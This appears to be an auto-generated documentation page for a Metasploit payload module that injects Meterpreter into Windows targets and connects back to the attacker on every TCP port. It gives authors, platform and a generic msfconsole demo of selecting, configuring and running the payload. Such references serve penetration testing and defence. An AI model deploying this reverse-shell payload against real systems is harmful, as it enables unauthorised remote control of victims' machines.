## Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager

Inject the meterpreter server DLL (staged). Try to connect 
back to the attacker, on all possible ports (1-65535, 
slowly)


## Module Name
payload/windows/patchupmeterpreter/reverse_tcp_allports

## Authors
* skape
* jt <jt@klake.org>
* hdm
* sf





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupmeterpreter/reverse_tcp_allports
msf payload(reverse_tcp_allports) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_allports) > set TARGET <target-id>
msf payload(reverse_tcp_allports) > show options
   ... show and set options ...
msf payload(reverse_tcp_allports) > run
```
    
    